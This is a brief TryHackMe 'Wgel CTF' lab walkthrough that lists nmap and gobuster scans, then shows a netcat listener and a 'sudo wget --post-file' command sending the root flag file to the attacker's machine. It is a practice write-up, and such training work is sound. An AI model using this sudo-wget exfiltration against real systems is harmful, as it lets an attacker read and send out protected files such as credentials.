#	Tryhackme - Wgel CTF 


```
export IP=10.10.255.246
```

##  Walkthrough by
```
Shaswata Saha
12-07-2023
12:37
```

##  Steps:
1.  nmap scan

2.  gobuster scan

3.  We get the root
```bash
nc -lnvp 9999
```
```bash
sudo wget --post-file=/root/root_flag.txt http://10.17.28.202:9999
```
